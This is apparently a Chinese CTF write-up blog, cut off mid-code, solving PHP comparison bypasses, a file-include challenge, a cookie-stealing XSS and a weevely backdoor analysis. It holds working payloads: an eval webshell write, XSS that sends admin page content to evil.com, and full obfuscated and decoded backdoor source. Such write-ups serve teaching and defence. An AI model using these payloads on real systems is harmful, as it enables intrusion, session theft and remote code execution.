class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// ========== Stage 1 ========== </span></span><br><span class="line">    $test=$_GET[<span class="string">&#x27;test&#x27;</span>]; </span><br><span class="line">    $test=md5($test); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($test==<span class="string">&#x27;0&#x27;</span>) &#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 1.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Game over at stage 1.&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== Stage 2 ========== </span></span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;name&#x27;</span>] == $_GET[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your name.&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 2.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Flag: &#x27;</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看源码一共有两关，第一关需要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5($_GET[<span class="string">&#x27;test&#x27;</span>]) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里用的是弱等于，所以只需要找到一个md5是0e开的字符串就行，例如<code>QNKCDZO</code>，在弱等于时0e开头的字符串将会识别为科学计数法。</p><p>第二关需要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[<span class="string">&#x27;name&#x27;</span>] != $_GET[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; sha1($_GET[<span class="string">&#x27;name&#x27;</span>]) === sha1($_GET[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里需要name和password不相等，但是他们的sha1要相等，并且还是强等于，由于sha1函数无法处理数组，所以当name和password同是数组时sha1函数将返回false，并且name和password是一个不相等的数组。<br>payload为<br><code>/?test=QNKCDZO&amp;name[]=a&amp;password[]=b</code></p><p>最后获得flag为<br><code>flag&#123;=_=PHP_1S_TH3_BES7_L4NGUAGE&#125;</code></p><hr><h1 id="Basic-PHP-2-75"><a href="#Basic-PHP-2-75" class="headerlink" title="Basic PHP 2(75)"></a>Basic PHP 2(75)</h1><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    $filename = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_int(stripos($content, <span class="string">&#x27;php&#x27;</span>)) || is_int(stripos($content, <span class="string">&#x27;&lt;&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        file_put_contents($filename, $content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是要写入一个webshell，文件名是config.php，所以不需要担心文件后缀的问题，但是源码里不允许在文件内容中出现<code>php</code>以及<code>&lt;</code>，类似Basic PHP 1，当传入的content是一个数组时，<code>stripos</code>函数将会返回false，这样就可以绕过<code>is_int</code>函数。<br>payload为<br><code>/index.php?content[]=&lt;%3Fphp+eval%28%24_GET%5Ba%5D%29%3B</code></p><p>最后获取flag为<br><code>flag&#123;pwnhub_first_shalon_ctf_web_php&#125;</code></p><hr><h1 id="BabyXSS-100"><a href="#BabyXSS-100" class="headerlink" title="BabyXSS(100)"></a>BabyXSS(100)</h1><p>是一个很简单的打cookie的XSS，提到了flag在admin.php里，但是需要admin的cookie。<br>测试paylaod</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://evil.com/xss/&#x27;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>发现有反应，那就可以直接在参数里带上cookie</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie)/&gt;</span><br></pre></td></tr></table></figure><p>但是发现发来的cookie是空的，所以拿不到管理员的cookie，但是可以用CSRF，通过XSS用管理员的cookie去访问admin.php，最后再把访问到的结果发到XSS服务器上。<br>payload如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">    if (xhr.readyState == 4)&#123;</span><br><span class="line"><span class="javascript">        img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        img.src = <span class="string">&#x27;http://evil.com/xss/?content=&#x27;</span> + <span class="built_in">escape</span>(xhr.responseText);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].appendChild(img);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/admin.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">xhr.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后获得的flag为<br><code>flag&#123;this_is_a_xss_flag&#125;</code></p><hr><h1 id="BasicFileInclude-150"><a href="#BasicFileInclude-150" class="headerlink" title="BasicFileInclude(150)"></a>BasicFileInclude(150)</h1><p>最简单的文件包含题目，url里直接包含了flag.php，那么就可以使用php伪协议读取flag.php，由于再后端结尾自动拼接了”.php”，所以就不用加上php文件后缀了。<br>payload如下<br><code>?page=php://filter/read=convert.base64-encode/resource=flag</code></p><p>最后获得flag为<br><code>flag&#123;really_basic_skill_web_dog_should_know&#125;</code></p><hr><h1 id="FxxkingBackdoor-175"><a href="#FxxkingBackdoor-175" class="headerlink" title="FxxkingBackdoor(175)"></a>FxxkingBackdoor(175)</h1><p>下载打开backdoor.php，这是一个木马软件weevely生成的php木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment">*/</span>$c=<span class="string">&#x27;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$e=<span class="string">&#x27;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$G=<span class="string">&#x27;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$g=<span class="string">&#x27;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$F=<span class="string">&#x27;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$I=<span class="string">&#x27;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$h=<span class="string">&#x27;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$K=<span class="string">&#x27;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$M=<span class="string">&#x27;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$C=<span class="string">&#x27;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$n=<span class="string">&#x27;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$p=<span class="string">&#x27;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$s=<span class="string">&#x27;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$R=<span class="string">&#x27;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$V=<span class="string">&#x27;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$y=<span class="string">&#x27;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$P=<span class="string">&#x27;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$t=<span class="string">&#x27;&#125;&#125;&#125;&#125;&#x27;</span>;$Y=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span>$L=str_replace(<span class="string">&#x27;)e&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$g.$V.$e.$n.$K.$c.$y.$h.$M.$C.$p.$R.$F.$I.$P.$G.$s.$t);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">echo</span> $L.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="keyword">echo</span> $Y;$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最前面都是经过混淆后的代码，最后真正开始执行的语句是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();</span><br></pre></td></tr></table></figure><p>所以在这条语句前打印一下看看它执行了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $Y.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;highlight_string($L);$v=$Y(<span class="string">&#x27;&#x27;</span>,$L);$v();</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_function</span><br><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;$kf=<span class="string">&quot;1f3c&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span>&#123;$c=strlen($k);$l=strlen($t);$o=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)&#123;<span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;<span class="keyword">return</span> $o;&#125;$r=$_SERVER;$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u[<span class="string">&quot;query&quot;</span>],$q);$q=array_values($q);preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);<span class="keyword">if</span>($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss=<span class="string">&quot;substr&quot;</span>;$sl=<span class="string">&quot;strtolower&quot;</span>;$i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];$h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));$f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));$p=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];<span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)&#123;$s[$i]=<span class="string">&quot;&quot;</span>;$p=$ss($p,<span class="number">3</span>);&#125;<span class="keyword">if</span>(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);<span class="keyword">if</span>($e)&#123;$k=$kh.$kf;ob_start();@<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@session_destroy();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因此L里面存储的是webshell的代码，Y是create_funciton，所以最后创建了一个匿名函数v去执行webshell，将L的代码格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>) </span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$l;) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;</span><br><span class="line">            $o.=$t &#123;</span><br><span class="line">                $i</span><br><span class="line">            &#125;</span><br><span class="line">            ^$k &#123;</span><br><span class="line">                $j</span><br><span class="line">            &#125;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line">$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra) &#123;</span><br><span class="line">    $u=parse_url($rr);</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">    $q=array_values($q);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $ss=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        $sl=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        $h=$sl($ss(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $f=$sl($ss(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($z=<span class="number">1</span>;$z&lt;count($m[<span class="number">1</span>]);$z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>) &#123;</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            $p=$ss($p,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s)) &#123;</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);</span><br><span class="line">            <span class="keyword">if</span>($e) &#123;</span><br><span class="line">                $k=$kh.$kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),$ss($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">                $o=ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再进一步反混淆</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">$kh=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_xor</span>(<span class="params">$content, $key</span>) </span>&#123;</span><br><span class="line">    $result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($content);)</span><br><span class="line">        <span class="keyword">for</span> ($j=<span class="number">0</span>; $j&lt;strlen($key)&amp;&amp;$i&lt;strlen($content); $j++, $i++)</span><br><span class="line">            $result .= $content&#123;$i&#125;^$key&#123;$j&#125;;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$referer = @$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$accept_language = @$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($referer &amp;&amp; $accept_language) &#123;</span><br><span class="line">    <span class="comment">// 解析http referer的query</span></span><br><span class="line">    parse_str(parse_url($referer)[<span class="string">&quot;query&quot;</span>], $query);</span><br><span class="line">    $query = array_values($query);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在accept language里找到paylaod参数</span></span><br><span class="line">    <span class="comment">// 例如fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5</span></span><br><span class="line">    <span class="comment">// 结果为</span></span><br><span class="line">    <span class="comment">// matched[0] = &#123;0 =&gt; &#x27;fr-CH,&#x27;, 1 =&gt; &#x27;fr;q=0.0,&#x27;, 2 =&gt; &#x27;en;q=0.1,&#x27;, 3 =&gt; &#x27;de;q=0.2,&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[1] = &#123;0 =&gt; &#x27;f&#x27;,      1 =&gt; &#x27;f&#x27;,         2 =&gt; &#x27;e&#x27;,         3 =&gt; &#x27;d&#x27;&#125;</span></span><br><span class="line">    <span class="comment">// matched[2] = &#123;0 =&gt; &#x27;&#x27;,       1 =&gt; &#x27;0&#x27;,         2 =&gt; &#x27;1&#x27;,         3 =&gt; &#x27;2&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>, $accept_language, $matched);</span><br><span class="line">    <span class="keyword">if</span>($query &amp;&amp; $matched) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        <span class="comment">// 取前两个权重开头字母作为用户标识，例如从fr-CH, fr;q=0.0, en;q=0.1, de;q=0.2, *;q=0.5里取出&#x27;ff&#x27;</span></span><br><span class="line">        $user = $matched[<span class="number">1</span>][<span class="number">0</span>].$matched[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 计算payload起始和结束标识符</span></span><br><span class="line">        $head = strtolower(substr(md5($user.$kh), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kh)[:3]</span></span><br><span class="line">        $tail = strtolower(substr(md5($user.$kf), <span class="number">0</span>, <span class="number">3</span>));  <span class="comment">// md5(&quot;ff&quot; + kf)[:3]</span></span><br><span class="line"></span><br><span class="line">        $payload = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;count($matched[<span 